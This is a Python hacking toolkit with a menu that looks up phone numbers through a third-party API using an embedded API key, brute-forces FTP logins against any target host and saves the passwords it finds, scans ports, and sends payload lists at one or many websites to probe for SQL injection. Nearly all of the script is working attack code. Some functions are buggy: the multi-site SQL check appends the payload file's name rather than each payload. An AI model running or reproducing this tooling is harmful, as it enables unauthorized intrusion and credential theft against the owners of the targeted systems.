import socket
import requests
import os
from colorama import Fore as F , init
from bs4 import BeautifulSoup
import re
import json
import sys
import time
import ftplib
init(autoreset=True)
from multiprocessing.dummy import Pool , Process
class hackernewsbdarija():
    def __init__(self) -> None:
        self.green = F.GREEN
        self.red = F.RED
        self.yellow = F.YELLOW
        self.headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"}
        self.url = 'https://api.veriphone.io/v2/verify?phone={}&key=5F3F2D6300E445DEA88684053144966C'
    def logo(self):
        print(f"""
                                        {self.green}
                               / 
                              / .'_
                             / __| 
             `.             | / (-' |
           `.  \_..._       :  (_,-/
         `-. `,'     `-.   /`-.__,'
            `/ __       \ /     /
            /`/  \       :'    /
          _,\o\_o/       /    /
         (_) ___.--.    /    /
          `-. -._.i \.      :
             `.\  ( |:.     |
            ,' )`-' |:..   / 
   __     ,'   |    `.:.      `.
  (_ `---:     )      \:.       
   ,'     `. .'\       \:.       )
 ,' ,'     ,'  \\ o    |:.      /
(_,'  ,7  /     \`.__.':..     /,,,
  (_,'(_,'   _gdMbp,,dp,,,,,,dMMMMMbp,,
          ,dMMMMMMMMMMMMMMMMMMMMMMMMMMMb,{self.red}
       .dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMb,  
     .dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM,
    ,MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
   dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.
 .dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMb
 {F.LIGHTBLUE_EX}
    [1] - FIND INFORMATION ABOUT NUMBER_PHONE
    [2] - CHECK IF NUMBER IS LIVE OR NOT : )
    [3] - CHECK BIG LIST OF PHONE_NUMBER :)
    [4] - FTP BRUTER :))
    [5] - PORT SCANNER :))
    [6] - CHECK IF WEBSITE IF VULN BY SQLIJECTION 
    [7] - CHECK YOUR LIST OF WEBSITES IF VULN BY SQLIJECTION""")    
    def option_1(self , phone):
        print(self.yellow + 'Phone Number  : {}'.format(phone))
        self.req = requests.get(self.url.format(phone)).text
        self.phone_json = re.findall('"phone": "(.*?)"' , self.req)[0]
        self.phone_valid = re.findall('"phone_valid": (.*?),' , self.req)[0]
        self.phone_type = re.findall('"phone_type": "(.*?),"' , self.req)[0]
        self.phone_cn = re.findall('"country": "(.*?)"' , self.req)[0]
        self.phone_prefix = re.findall('"country_prefix": "(.*?)"' , self.req)[0]
        self.car = re.findall(',"carrier": "(.*?)"' , self.req)[0]
        print("")
        print(F.LIGHTMAGENTA_EX+'----------------------------------------------')
        print(f' {F.BLUE} [+] Phone Number -->> {self.phone_json}')
        print(F.LIGHTMAGENTA_EX+'----------------------------------------------')
        print(f'{F.BLUE} [+] PHONE TRUE/FLASE -->> {self.phone_valid} ')
        print(F.LIGHTMAGENTA_EX+'----------------------------------------------')
        print(f'{F.BLUE} [+] PHONE TYPE -->> {self.phone_type} ')
        print(F.LIGHTMAGENTA_EX+'----------------------------------------------')
        print(f' {F.BLUE}[+] PHONE COUNTRY -->> {self.phone_cn} ')
        print(F.LIGHTMAGENTA_EX+'----------------------------------------------')
        print(f' {F.BLUE}[+] PHONE PREFIX -->> {self.phone_prefix} ')
        print(F.LIGHTMAGENTA_EX+'----------------------------------------------')
        print(f' {F.BLUE}[+] PHONE CARRIER -->> {self.car} ')   
    def option_2(self , phoneaswell):
        print(self.yellow + 'Phone Number  : {}'.format(phoneaswell))
        print("")
        print(F.LIGHTMAGENTA_EX+'----------------------------------------------')
        self.req_ = requests.get(self.url.format(phoneaswell)).text
        print(self.green+'IF U SEE THE PHONE_VALID IS TRUE : THAT MEAN IS A LIVE PHONE NUMBER HOWEVER IF U FIND IT FALSE THAT"S MEAN ISN"T LIVE :D ')
        self.phone_valid__ = re.findall('"phone_valid": (.*?),' , self.req_)[0]
        print(f'{F.BLUE} [+] PHONE TRUE/FLASE -->> {self.phone_valid__} ')    
    def opetion_3(self , phone_list):
        phone_listn = open(phone_list,'r')
        for line in phone_listn.readlines() : 
            line = line.strip()
        #print(self.yellow + 'Phone Number  : {}'.format(phone_list))
            print("")
            print(self.yellow + 'Phone Number  : {}'.format(line))
            print(F.LIGHTMAGENTA_EX+'----------------------------------------------')
            self.req_ = requests.get(self.url.format(line)).text
            #print(self.green+'IF U SEE THE PHONE_VALID IS TRUE : THAT MEAN IS A LIVE PHONE NUMBER HOWEVER IF U FIND IT FALSE THAT"S MEAN ISN"T LIVE :D ')
            self.phone_valid__ = re.findall('"phone_valid": (.*?),' , self.req_)[0]
            print(f'{F.BLUE} [+] PHONE TRUE/FLASE -->> {self.phone_valid__} ')
    def bruteforce(self ,passwordlist):
        self.host = input('[*] TARGET ->>  ')
        self.user = input('[*] USER LOGIN ->>  ')
        print('Tring to Connect to Port !!')
        time.sleep(3)
        s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        if s.connect_ex((self.host , 21)) == 0 : 
            print('PORT 21 OPEN :)) ')
            time.sleep(1)
            with open(passwordlist,'r') as f : 
                for line in f :
                    line = line.strip()
                    try : 
                        print('Tring with User : {} | Password : {} | Host = {} '.format(self.user , line , self.host))
                        ftp = ftplib.FTP(self.host)
                        ftp.login(self.user,line)
                        print(F.GREEN + 'Login Found as User : {} | Password : {} | Host = {} '.format(self.user , line , self.host))
                        with open('Password.txt','a') as out : 
                            out.write('Login Found as User : {} | Password : {} | Host = {} '.format(self.user , line , self.host))
                        sys.exit()
                        break
                    except : 
                        print(F.RED + 'Not Found With User : {} | Password : {} | Host = {} '.format(self.user , line , self.host))
        else : 
            print('WTF ? FTP PORT ISN"T OPEN AND U WANT TO BRUTE IT ???? ')    
            sys.exit()
    def sql_first(self , web , payload):
        with open(payload , 'r') as f : 
            for line in f.readlines():
                line = line.strip()
                sql_rq_first = requests.get(web+line ,headers=self.headers).text
                if 'you have an error in your sql syntax;' in sql_rq_first or 'you have an error in your sql syntax' in sql_rq_first or 'sql syntax;' in sql_rq_first or 'sql syntax' in sql_rq_first or 'sql error' in sql_rq_first or 'warning: mysql' in sql_rq_first or'unclosed quotation mark after the character string' in sql_rq_first or 'quoted string not properly terminated' in sql_rq_first or ' mysql_fetch_array' in sql_rq_first or 'mysql' in sql_rq_first : 
                    print(self.green+'Website Is Vuln as SqlInjection : 3 -- >> {} '.format(web+line))
                else : 
                    print(self.green+'NOT WORK AS THAT >  : 3 -- >> {} '.format(web+line))

    def sql_two(self , list_website , payload):
        ro = open(list_website,mode='r')
        ro = list(ro)
        with open(payload , 'r') as o : 
            for py in o : 
                for line in ro : 
                    line = line.strip()
                    sql_rq_first = requests.get(line+payload,headers=self.headers).text
                    if 'you have an error in your sql syntax;' in sql_rq_first or 'you have an error in your sql syntax' in sql_rq_first or 'sql syntax;' in sql_rq_first or 'sql syntax' in sql_rq_first or 'sql error' in sql_rq_first or 'warning: mysql' in sql_rq_first or'unclosed quotation mark after the character string' in sql_rq_first or 'quoted string not properly terminated' in sql_rq_first or ' mysql_fetch_array' in sql_rq_first or 'mysql' in sql_rq_first : 
                        print(self.green+'Website Is Vuln as SqlInjection : 3 -- >> {} '.format(line+py))
                    else : 
                        print(self.red+'NOT WORK AS THAT >  : 3 -- >> {} '.format(line+py))


if __name__ == '__main__':
    hackernewsbdarija().logo()
    which = input('   [+] WHAT    ? >  ')
    if which == '1':
        phone = input('[+]  Phone Number : >   ')
        hackernewsbdarija().logo()
        hackernewsbdarija().option_1(phone)        
    elif which == '2':
        phone_2 = input('[+]  Phone Number : >   ')
        hackernewsbdarija().logo()
        hackernewsbdarija().option_1(phone_2) 
    elif which == '3':
        file = input('[*]   Phone Number List >>  ')
        hackernewsbdarija().opetion_3(file)
    elif which == '4':
        list_password = input('[*] List of Password To Brute -->>  ')
        hackernewsbdarija().bruteforce(list_password)
    elif which == '6':
        hackernewsbdarija().logo()
        print(F.GREEN+
        """READ THIS :
                PLEASE GIVE US THE WEBSITE WITH THE PARAMTER FOR EXMPL  : http://website.com/k= """)
        website = input('[*]  WEBSITE -->> ')
        payload_list = input('[*] PAYLOAD LIST OF MYSQL INJECTION -->> ')
        hackernewsbdarija().sql_first(website ,payload_list)
    elif which == '7':
        website_ = input('[*]  WEBSITE LIST -->> ')
        payload_lis_t = input('[*] PAYLOAD LIST OF MYSQL INJECTION -->> ')
        hackernewsbdarija().sql_two(website_ , payload_lis_t)
    elif which == '5':
        def port():
            try : 
                ip = input('[*] TARGET -->>  ')
                from_0 = int(input('[+] FROM WHICH PORT -->> '))
                tp = int(input('[+] TO PORT -->> '))
                print('SCANNING !! ...')
                s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
                for x in range(int(from_0),int(tp)):
                    #s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
                    if s.connect_ex((ip,x)) == 0:
                        print(F.GREEN+ 'Open port : {}'.format(str(x)))
                    else : 
                        pass
            except Exception as o  :
                pass
        port()